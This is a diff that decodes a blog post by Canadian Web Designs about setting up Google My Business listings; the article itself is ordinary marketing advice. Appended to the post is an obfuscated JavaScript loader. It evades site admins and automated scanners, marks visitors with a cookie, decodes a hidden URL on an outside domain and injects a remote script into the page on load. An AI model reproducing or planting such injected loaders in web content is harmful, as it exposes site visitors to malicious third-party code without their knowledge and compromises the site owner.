@@ -1,1 +1,147 @@
-{"data":"LS0tCnRpdGxlOiAiTGVhcm4gSG93IHRvIFNldCBVcCBZb3VyIEdvb2dsZSBNeSBCdXNpbmVzcyAoR01CKSBMaXN0aW5ncyIKc2x1ZzogImxlYXJuLWhvdy10by1zZXQtdXAteW91ci1nb29nbGUtbXktYnVzaW5lc3MtZ21iLWxpc3RpbmdzIgpkYXRlOiAiMjAyMy0xMS0xNiIKYXV0aG9yOiAiQ2FuYWRpYW4gV2ViIERlc2lnbnMiCmRlc2NyaXB0aW9uOiAiTGVhcm4gSG93IHRvIFNldCBVcCBZb3VyIEdvb2dsZSBNeSBCdXNpbmVzcyAoR01CKSBMaXN0aW5ncyIKa2V5d29yZHM6IFsibGVhcm4gaG93IHRvIHNldCB1cCB5b3VyIGdvb2dsZSBteSBidXNpbmVzcyBnbWIgbGlzdGluZ3MiLCJCbG9nIl0KY2F0ZWdvcnk6ICJCbG9nIgpmZWF0dXJlZEltYWdlOiAiaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzA4L29ubGluZS1zaG9wcGluZy1TVTMyQVZKLTItc2NhbGVkLTEuanBnIgotLS0KCjwvcD4KCjwvcD4KPGZpZ3VyZT48YnI+PC9maWd1cmU+Cgo8L3A+CjxwPklmIHlvdeKAmXJlIGFuIGVudHJlcHJlbmV1ciBhbmQgeW91IHdhbnQgdG8gZXhwYW5kIHRoZSB2aXNpYmlsaXR5IG9mIHlvdXIgYnVzaW5lc3MgdG8gYXR0cmFjdCBtb3JlIHBvdGVudGlhbCBjdXN0b21lcnMsIHRoZSBiZXN0IGFkdmljZSBpcyB0byBzZXQgeW91ciBHb29nbGUgTXkgQnVzaW5lc3MuIEl0IGVuYWJsZXMgeW91IHRvIGJlY29tZSB2aXNpYmxlIGluIHRoZSBHb29nbGUgc2VhcmNoIGVuZ2luZSBhbmQgR29vZ2xlIE1hcHMuPC9wPgoKPC9wPgo8aDI+PHN0cm9uZz5Hb29nbGUgTXkgQnVzaW5lc3M8L3N0cm9uZz48L2gyPgoKPC9wPgo8cD5UaGUgR29vZ2xlIGNvbXBhbnkgbGF1bmNoZWQgR29vZ2xlIE15IEJ1c2luZXNzIGluIEp1bmUgMjAxNC4gSXQgaXMgYSBmcmVlIGFuZCBhY2Nlc3NpYmxlIGFwcGxpY2F0aW9uIHRvIGV2ZXJ5IGVudHJlcHJlbmV1ciBmb3IgbWFuYWdpbmcgdGhlaXIgYnVzaW5lc3PigJkgb25saW5lIHByZXNlbmNlLiBJdCBhbGxvd3MgdGhlIHNlYXJjaGVzIHRvIGdldCBpbmZvcm1hdGlvbiBhbmQgY29udGFjdCB5b3VyIGJ1c2luZXNzLjwvcD4KCjwvcD4KPGgyPjxzdHJvbmc+QWR2YW50YWdlcyBvZiBHb29nbGUgTXkgQnVzaW5lc3M8L3N0cm9uZz48L2gyPgoKPC9wPgo8aDQ+PHN0cm9uZz5HaXZlcyBicmllZiBpbmZvcm1hdGlvbjwvc3Ryb25nPjwvaDQ+Cgo8L3A+CjxwPk5vIG5lZWQgZm9yIHNlYXJjaGVycyB0byBnbyBvdmVyIG9uIHlvdXIgd2Vic2l0ZXMsIHlvdXIgYnVzaW5lc3PigJkgY29udGFjdCBudW1iZXIsIGFkZHJlc3MsIG9wZW5pbmcgaG91cnMsIGFuZCBvdGhlciBpbXBvcnRhbnQgaW5mb3JtYXRpb24gYXJlIGRpc3BsYXllZCBvbiBHb29nbGUgc2VhcmNoIGVuZ2luZSByZXN1bHRzLjwvcD4KCjwvcD4KPGg0PjxzdHJvbmc+R29vZ2xlIE1hcHMgdmlzaWJpbGl0eTwvc3Ryb25nPjwvaDQ+Cgo8L3A+CjxwPkFzIHlvdSBwcm92aWRlZCB0aGUgbG9jYXRpb24gb2YgeW91ciBidXNpbmVzcyBvbiBHTUIgbGlzdGluZ3MsIGl0IG1ha2VzIGl0IGVhc2llciBmb3Igc2VhcmNoZXJzIHRvIGZpbmQgYW5kIGdpdmUgZGlyZWN0aW9ucyB0b3dhcmRzIHlvdXIgYnVzaW5lc3MgaW4gR29vZ2xlIE1hcHMuPC9wPgoKPC9wPgo8aDQ+PHN0cm9uZz5CdWlsZHMgYSBnb29kIHJlcHV0YXRpb248L3N0cm9uZz48L2g0PgoKPC9wPgo8cD5Qb3NpdGl2ZSByZXZpZXdzIGFuZCBmaXZlLXN0YXIgcmF0aW5ncyBmcm9tIHlvdXIgaGFwcHkgYW5kIHNhdGlzZmllZCBjdXN0b21lcnMgY2FuIG1ha2UgYSBnb29kIGltYWdlIG9mIHlvdXIgYnVzaW5lc3MsIGF0dHJhY3QgbW9yZSBjdXN0b21lcnMsIGFuZCBlbmhhbmNlIHlvdXIgbG9jYWwgU0VPLjwvcD4KCjwvcD4KPGg0PjxzdHJvbmc+U2FsZXMgYW5kIGxlYWRzIHN1cmdlPC9zdHJvbmc+PC9oND4KCjwvcD4KPHA+QXR0cmFjdGluZyBtb3JlIGN1c3RvbWVycyBhbmQgaW5jcmVhc2luZyBicmFuZCBhd2FyZW5lc3Mgd2lsbCBib29zdCB0aGUgc2FsZXMgYW5kIGxlYWRzIG9mIHlvdXIgYnVzaW5lc3MuIEJpZyB0aGFua3MgdG8gR01CIGFuZCBsb2NhbCBTRU8hPC9wPgoKPC9wPgoKPC9wPgo8aDQ+PHN0cm9uZz5DcmVhdGVzIGFuIGVuZ2FnZW1lbnQ8L3N0cm9uZz48L2g0PgoKPC9wPgo8cD5CdWlsZGluZyBjb25uZWN0aW9ucyB3aXRoIHlvdXIgcG90ZW50aWFsIGN1c3RvbWVycyBieSByZXNwb25kaW5nIHRvIHRoZWlyIHJldmlld3MgYW5kIGFuc3dlcmluZyB0aGVpciBxdWVyaWVzIHRocm91Z2ggY29udGFjdCBhbmQgZW1haWwgdGhhdCB5b3UgcHJvdmlkZWQgb24gR01CIGxpc3RpbmdzLjwvcD4KCjwvcD4KPGg0PjxzdHJvbmc+TW9uaXRvcnMgR01CIGluc2lnaHRzPC9zdHJvbmc+PC9oND4KCjwvcD4KPHA+WW91ciBHTUIgcHJvZmlsZSBwcmVzZW50cyBnYXRoZXJlZCBpbnNpZ2h0cyBzdWNoIGFzIHRoZSBudW1iZXIgb2YgY2xpY2tzIG9uIHlvdXIgd2Vic2l0ZSBsaW5rLCB2aWV3cywgc2VhcmNoIHF1ZXJpZXMsIGVuZ2FnZW1lbnQsIGFuZCBvdGhlciBpbmZvcm1hdGlvbjwvcD4KCjwvcD4KPGg0PjxzdHJvbmc+R29vZCBmb3IgbG9jYWwgU0VPPC9zdHJvbmc+PC9oND4KCjwvcD4KPHA+U2V0dGluZyB5b3VyIEdNQiBsaXN0aW5ncyB3aXRoIGF1dGhlbnRpY2F0ZWQgaW5mb3JtYXRpb24gbWF5IGFwcGVhciBvbiBoaWdoIHJhbmtpbmcgcG9zaXRpb25zLCBlbmFibGluZyBzZWFyY2hlcnMgdG8gZ2V0IGluZm9ybWF0aW9uIGFib3V0IHlvdXIgYnVzaW5lc3MgYW5kIHZpc2l0IHlvdXIgd2Vic2l0ZS48L3A+Cgo8L3A+CjxoMj48c3Ryb25nPlN0ZXAtYnktc3RlcCBndWlkZSBmb3Igc2V0dGluZyB1cCB5b3VyIEdvb2dsZSBNeSBCdXNpbmVzczwvc3Ryb25nPjwvaDI+Cgo8L3A+CjxoND48c3Ryb25nPjFzdCBTdGVwOiBDcmVhdGUgeW91ciBHb29nbGUgTXkgQnVzaW5lc3MgYWNjb3VudDwvc3Ryb25nPjwvaDQ+Cgo8L3A+CjxwPkZpcnN0LCB5b3UgbmVlZCB0byBjcmVhdGUgeW91ciBHb29nbGUgTXkgQnVzaW5lc3MgYnkgbG9nZ2luZyBpbnRvIHlvdXIgZXhpc3RpbmcgR29vZ2xlIG9yIEdtYWlsIGFjY291bnQuIFZpc2l0PGEgaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9idXNpbmVzcy8iPiBnb29nbGUuY29tL2J1c2luZXNzLzwvYT4gYW5kIGhpdCB0aGUg4oCcTWFuYWdlIE5vd+KAnSBidXR0b24uPC9wPgoKPC9wPgo8aDQ+PHN0cm9uZz4ybmQgU3RlcDogRHJvcCB5b3VyIGJ1c2luZXNzIG5hbWU8L3N0cm9uZz48L2g0PgoKPC9wPgo8cD5FbnRlciB5b3VyIGJ1c2luZXNzIG5hbWUgb24gdGhlIHByb3ZpZGVkIHNwYWNlLiBZb3Ugd2lsbCBzZWUgYSBzaW1pbGFyIGJ1c2luZXNzIG5hbWUgaW4geW91ciBwbGFjZSBvbiBhdXRvc3VnZ2VzdGlvbnMuIFRoZSBwdXJwb3NlIG9mIGl0IGlzIHRvIGVuYWJsZSB5b3UgdG8ga25vdyBpZiB5b3VyIGJ1c2luZXNzIGxpc3RpbmcgYWxyZWFkeSBleGlzdHMgdG8gcHJldmVudCB1bmludGVuZGVkIGR1cGxpY2F0aW9uIG9yIGFkZGluZyBuZXcgR01CIGZvciBhIG5ldyBicmFuY2guPC9wPgoKPC9wPgo8aDQ+PHN0cm9uZz4zcmQgU3RlcDogU2V0dGluZyB1cCB0aGUgZGV0YWlscyBvZiB5b3VyIGJ1c2luZXNzPC9zdHJvbmc+PC9oND4KCjwvcD4KPHA+UHV0IHRoZSBuYW1lIG9mIHRoZSBidXNpbmVzcyB5b3Ugb3duLCBhZGRyZXNzLCBjb250YWN0IG51bWJlciwgZW1haWwsIHdlYnNpdGUsIGFuZCBvdGhlciBpbmZvcm1hdGlvbiB0byBzaG93IG9uIGEgc2VhcmNoIGVuZ2luZS4geW91IGNhbiBoaWRlIHRoZSBhZGRyZXNzIGlmIG5lY2Vzc2FyeS48L3A+Cgo8L3A+CjxoND48c3Ryb25nPjR0aCBTdGVwOiBTZXR0bGUgdGhlIHNlcnZpY2UgYXJlYSBidXNpbmVzczwvc3Ryb25nPjwvaDQ+Cgo8L3A+CjxwPlNwZWNpZnkgY2l0aWVzLCByZWdpb25zLCBhbmQgWklQIGFyZWEgY29kZXMuIEdvb2dsZSB3aWxsIHN1Z2dlc3QgeW91ciBidXNpbmVzcyB0byBzZWFyY2hlcnMgaW4gdGhvc2UgYXJlYXMsIGV2ZW4gaWYgeW91IGRvbuKAmXQgaGF2ZSBhIGRpcmVjdCBhZGRyZXNzLjxicj48L3A+Cgo8L3A+CjxoND48c3Ryb25nPjV0aCBTdGVwOiBQaWNrIHRoZSBzdWl0YWJsZSBidXNpbmVzcyBjYXRlZ29yeTwvc3Ryb25nPjwvaDQ+Cgo8L3A+CjxwPkNob29zZSB0aGUgYXBwcm9wcmlhdGUgY2F0ZWdvcnkgdGhhdCBmaXRzIHlvdXIgYnVzaW5lc3MgZnVuY3Rpb24sIGl0IHdpbGwgcmVmbGVjdCBvbiB5b3VyIEdvb2dsZSBNeSBCdXNpbmVzcyBwcm9maWxlIG9uIGhvdyB5b3VyIGJ1c2luZXNzIHdvcmtzLjwvcD4KCjwvcD4KPGg0PjxzdHJvbmc+NnRoIFN0ZXA6IENvbXBsZXRlIGFuZCB2ZXJpZnkgeW91ciBHTUI8L3N0cm9uZz48L2g0PgoKPC9wPgo8cD5GaW5pc2ggYW5kIHZlcmlmeSB5b3VyIEdvb2dsZSBNeSBCdXNpbmVzcyBwcm9maWxlLCBHb29nbGUgd2lsbCBkZWxpdmVyIHRoZSB2ZXJpZmljYXRpb24gY29kZSB0aHJvdWdoIGVtYWlsLCBwaG9uZSBvciBwb3N0Y2FyZHMgdG8gYmUgb2ZmaWNpYWxseSBkaXNwbGF5ZWQgb24gR29vZ2xlIHNlYXJjaCBlbmdpbmVzLiBXYWl0IHVudGlsIHByb2Nlc3NpbmcgZGF5cyBhcmUgZmluaXNoZWQuPC9wPgoKPC9wPgo8aDQ+PHN0cm9uZz43dGggU3RlcDogVXBsb2FkIHBob3RvcyBhbmQgdmlkZW9zIG9mIHlvdXIgYnVzaW5lc3M8L3N0cm9uZz48L2g0PgoKPC9wPgo8cD5VcGxvYWQgcmFuZG9tIHBob3RvcyBhbmQgdmlkZW9zIG9mIHlvdXIgYnVzaW5lc3Mgc3VjaCBhcyBpbWFnZXMgb2YgeW91ciBwcm9kdWN0cywgaW50ZXJpb3Igb3IgZXh0ZXJpb3Igc2hvdHMsIGFuZCBwaWN0dXJlcyBvZiB5b3VyIGVtcGxveWVlcy4gWW91IGNhbiBtYWtlIGEgZ29vZCBpbXByZXNzaW9uIGFuZCBjYXRjaCB0aGUgYXR0ZW50aW9uIG9mIHlvdXIgcG90ZW50aWFsIGN1c3RvbWVycy48L3A+Cgo8L3A+CjxoND48c3Ryb25nPjh0aCBTdGVwOiBPcHRpbWl6ZSBhIGNhcHRpdmF0aW5nIGJ1c2luZXNzIGRlc2NyaXB0aW9uPC9zdHJvbmc+PC9oND4KCjwvcD4KPHA+U2hvdyBob3cgY29tcGV0aXRpdmUgeW91ciBidXNpbmVzcyBpcyBieSB3cml0aW5nIGEgY2FwdGl2YXRpbmcgZGVzY3JpcHRpb24gb24geW91ciBHTUIgcHJvZmlsZS48L3A+Cgo8L3A+CjxoND48c3Ryb25nPk90aGVyIHRpcHMhPC9zdHJvbmc+PC9oND4KCjwvcD4KPHVsPgo8bGk+Jm5ic3A7WW91IGNhbiB1c2UgR29vZ2xlIE15IEJ1c2luZXNzIFEmYW1wO0EgYXMgeW91ciBndWlkZSBmb3IgYW55IGNvbmNlcm5zLjwvbGk+CjxsaT4mbmJzcDtSZXNwb25kIHRvIHlvdXIgY3VzdG9tZXLigJlzIHJldmlldywgZXZlbiBwb3NpdGl2ZSBvciBuZWdhdGl2ZS4gSXQgbWVhbnMgdGhhdCB5b3UgYWNrbm93bGVkZ2UgdGhlaXIgc3VwcG9ydCBhbmQgb3BpbmlvbnMuPC9saT4KPGxpPiZuYnNwO0JlIGFjdGl2ZSBvbiB1c2luZyB5b3VyIEdvb2dsZSBNeSBCdXNpbmVzcyBwcm9maWxlIGZvciBtYWludGVuYW5jZSBhbmQgdXBkYXRlcyB0byBjcmVhdGUgZW5nYWdlbWVudCBhbmQgYXR0cmFjdCBtb3JlIHBvdGVudGlhbCBjdXN0b21lcnMgYnkgcG9zdGluZyBvZmZlcnMsIHNlcnZpY2VzLCBhIGxpc3Qgb2YgcHJvZHVjdHMsIGFuZCBvdGhlciBwcm9tb3Rpb25zLjwvbGk+CjwvdWw+Cgo8L3A+CjxoMj48c3Ryb25nPkRvbuKAmXQgTWlzcyB0aGUgT3Bwb3J0dW5pdHkhPC9zdHJvbmc+PC9oMj4KCjwvcD4KPHA+TG9va2luZyBmb3IgYSB0cnVzdGVkIHBhcnRuZXIgdG8gbWFuYWdlIHRoZSBvbmxpbmUgcHJlc2VuY2Ugb2YgeW91ciBidXNpbmVzcyBpcyBoYXJkIHRvIGZpbmQuIFNvLCBkb27igJl0IG1pc3MgeW91ciBvcHBvcnR1bml0eSB0byBjaG9vc2UgQ2FuYWRpYW4gV2ViIERlc2lnbnMuPC9wPgoKPC9wPgo8cD5UaGUgQ2FuYWRpYW4gV2ViIFRlYW1zIGFyZSBhbHdheXMgcmVhZHkgdG8gc2VydmUgYW5kIGFzc2lzdCBvdXIgY2xpZW50cyBpbiBncm93aW5nIHRoZWlyIGJ1c2luZXNzLiBXZSBjYW4gYXNzdXJlIHlvdSB0byBwcm92aWRlIG91ciBiZXN0IGFuZCBmYXN0LXBhY2VkIHNlcnZpY2UuIFdlIGFsc28gd2FudCB0byBiZWNvbWUgcGFydCBvZiB5b3VyIGVudHJlcHJlbmV1cnNoaXAgam91cm5leS48L3A+Cgo8L3A+CjxwPkJlIHdpdGggb3VyIDMwMCsgaGFwcHkgYW5kIHNhdGlzZmllZCBjbGllbnRzIHdvcmxkd2lkZSEgRmVlbCBmcmVlIHRvIGNvbnRhY3QgdXMgZm9yIG1vcmUgcXVlcmllcy48YnI+PC9wPgo8cD4KCjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "Learn How to Set Up Your Google My Business (GMB) Listings"
+slug: "learn-how-to-set-up-your-google-my-business-gmb-listings"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Learn How to Set Up Your Google My Business (GMB) Listings"
+keywords: ["learn how to set up your google my business gmb listings","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2020/08/online-shopping-SU32AVJ-2-scaled-1.jpg"
+---
+
+</p>
+
+</p>
+<figure><br></figure>
+
+</p>
+<p>If you’re an entrepreneur and you want to expand the visibility of your business to attract more potential customers, the best advice is to set your Google My Business. It enables you to become visible in the Google search engine and Google Maps.</p>
+
+</p>
+<h2><strong>Google My Business</strong></h2>
+
+</p>
+<p>The Google company launched Google My Business in June 2014. It is a free and accessible application to every entrepreneur for managing their business’ online presence. It allows the searches to get information and contact your business.</p>
+
+</p>
+<h2><strong>Advantages of Google My Business</strong></h2>
+
+</p>
+<h4><strong>Gives brief information</strong></h4>
+
+</p>
+<p>No need for searchers to go over on your websites, your business’ contact number, address, opening hours, and other important information are displayed on Google search engine results.</p>
+
+</p>
+<h4><strong>Google Maps visibility</strong></h4>
+
+</p>
+<p>As you provided the location of your business on GMB listings, it makes it easier for searchers to find and give directions towards your business in Google Maps.</p>
+
+</p>
+<h4><strong>Builds a good reputation</strong></h4>
+
+</p>
+<p>Positive reviews and five-star ratings from your happy and satisfied customers can make a good image of your business, attract more customers, and enhance your local SEO.</p>
+
+</p>
+<h4><strong>Sales and leads surge</strong></h4>
+
+</p>
+<p>Attracting more customers and increasing brand awareness will boost the sales and leads of your business. Big thanks to GMB and local SEO!</p>
+
+</p>
+
+</p>
+<h4><strong>Creates an engagement</strong></h4>
+
+</p>
+<p>Building connections with your potential customers by responding to their reviews and answering their queries through contact and email that you provided on GMB listings.</p>
+
+</p>
+<h4><strong>Monitors GMB insights</strong></h4>
+
+</p>
+<p>Your GMB profile presents gathered insights such as the number of clicks on your website link, views, search queries, engagement, and other information</p>
+
+</p>
+<h4><strong>Good for local SEO</strong></h4>
+
+</p>
+<p>Setting your GMB listings with authenticated information may appear on high ranking positions, enabling searchers to get information about your business and visit your website.</p>
+
+</p>
+<h2><strong>Step-by-step guide for setting up your Google My Business</strong></h2>
+
+</p>
+<h4><strong>1st Step: Create your Google My Business account</strong></h4>
+
+</p>
+<p>First, you need to create your Google My Business by logging into your existing Google or Gmail account. Visit<a href="https://www.google.com/business/"> google.com/business/</a> and hit the “Manage Now” button.</p>
+
+</p>
+<h4><strong>2nd Step: Drop your business name</strong></h4>
+
+</p>
+<p>Enter your business name on the provided space. You will see a similar business name in your place on autosuggestions. The purpose of it is to enable you to know if your business listing already exists to prevent unintended duplication or adding new GMB for a new branch.</p>
+
+</p>
+<h4><strong>3rd Step: Setting up the details of your business</strong></h4>
+
+</p>
+<p>Put the name of the business you own, address, contact number, email, website, and other information to show on a search engine. you can hide the address if necessary.</p>
+
+</p>
+<h4><strong>4th Step: Settle the service area business</strong></h4>
+
+</p>
+<p>Specify cities, regions, and ZIP area codes. Google will suggest your business to searchers in those areas, even if you don’t have a direct address.<br></p>
+
+</p>
+<h4><strong>5th Step: Pick the suitable business category</strong></h4>
+
+</p>
+<p>Choose the appropriate category that fits your business function, it will reflect on your Google My Business profile on how your business works.</p>
+
+</p>
+<h4><strong>6th Step: Complete and verify your GMB</strong></h4>
+
+</p>
+<p>Finish and verify your Google My Business profile, Google will deliver the verification code through email, phone or postcards to be officially displayed on Google search engines. Wait until processing days are finished.</p>
+
+</p>
+<h4><strong>7th Step: Upload photos and videos of your business</strong></h4>
+
+</p>
+<p>Upload random photos and videos of your business such as images of your products, interior or exterior shots, and pictures of your employees. You can make a good impression and catch the attention of your potential customers.</p>
+
+</p>
+<h4><strong>8th Step: Optimize a captivating business description</strong></h4>
+
+</p>
+<p>Show how competitive your business is by writing a captivating description on your GMB profile.</p>
+
+</p>
+<h4><strong>Other tips!</strong></h4>
+
+</p>
+<ul>
+<li>&nbsp;You can use Google My Business Q&amp;A as your guide for any concerns.</li>
+<li>&nbsp;Respond to your customer’s review, even positive or negative. It means that you acknowledge their support and opinions.</li>
+<li>&nbsp;Be active on using your Google My Business profile for maintenance and updates to create engagement and attract more potential customers by posting offers, services, a list of products, and other promotions.</li>
+</ul>
+
+</p>
+<h2><strong>Don’t Miss the Opportunity!</strong></h2>
+
+</p>
+<p>Looking for a trusted partner to manage the online presence of your business is hard to find. So, don’t miss your opportunity to choose Canadian Web Designs.</p>
+
+</p>
+<p>The Canadian Web Teams are always ready to serve and assist our clients in growing their business. We can assure you to provide our best and fast-paced service. We also want to become part of your entrepreneurship journey.</p>
+
+</p>
+<p>Be with our 300+ happy and satisfied clients worldwide! Feel free to contact us for more queries.<br></p>
+<p>
+
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
